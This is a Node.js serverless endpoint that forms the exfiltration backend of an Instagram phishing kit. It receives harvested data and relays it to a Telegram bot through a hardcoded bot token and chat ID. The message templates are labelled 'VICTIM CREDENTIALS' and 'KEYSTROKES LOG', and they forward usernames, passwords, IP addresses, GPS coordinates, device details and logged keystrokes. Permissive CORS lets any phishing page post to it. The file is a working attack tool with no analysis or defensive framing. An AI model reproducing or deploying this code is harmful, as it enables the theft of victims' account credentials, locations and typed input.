// api/telegram.js
const fetch = require('node-fetch');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  
  // Handle OPTIONS request
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    const data = req.body;
    const BOT_TOKEN = process.env.BOT_TOKEN || '8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o';
    const CHAT_ID = process.env.CHAT_ID || '7933552719';
    
    let message = '';
    
    // Format message based on type
    switch (data.type) {
      case 'credentials':
        message = `🔥 *VICTIM CREDENTIALS* 🔥\n\n`
                + `👤 *Username:* \`${data.username}\`\n`
                + `🔑 *Password:* \`${data.password}\`\n`
                + `🌐 *IP:* \`${data.ip}\`\n`
                + `📍 *Location:* ${data.location ? `Lat: ${data.location.lat}, Lon: ${data.location.lon}` : 'N/A'}\n`
                + `🖥️ *Device:* ${data.device.platform}\n`
                + `📱 *Screen:* ${data.device.screen}\n`
                + `⏰ *Time:* ${new Date(data.timestamp).toLocaleString('id-ID')}\n\n`
                + `#victim #instagram #phish`;
        break;
        
      case 'location':
        message = `📍 *LOCATION CAPTURED*\n\n`
                + `*Latitude:* ${data.lat}\n`
                + `*Longitude:* ${data.lon}\n`
                + `*Accuracy:* ${data.accuracy}m\n`
                + `*Time:* ${new Date(data.timestamp).toLocaleString('id-ID')}\n\n`
                + `[View on Maps](https://maps.google.com/?q=${data.lat},${data.lon})`;
        break;
        
      case 'keystrokes':
        message = `⌨️ *KEYSTROKES LOG*\n\n`
                + `*Page:* ${data.page}\n`
                + `*Data:* \`${data.data}\`\n`
                + `*Time:* ${new Date(data.timestamp).toLocaleString('id-ID')}`;
        break;
        
      default:
        message = `📨 *NEW DATA*\n\n${JSON.stringify(data, null, 2)}`;
    }
    
    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    
    // Log to console (for Vercel logs)
    console.log('Telegram send result:', {
      success: result.ok,
      dataType: data.type,
      timestamp: new Date().toISOString()
    });
    
    return res.status(200).json({
      success: true,
      telegramResult: result
    });
    
  } catch (error) {
    console.error('Error in telegram API:', error);
    return res.status(500).json({
      success: false,
      error: error.message
    });
  }
};
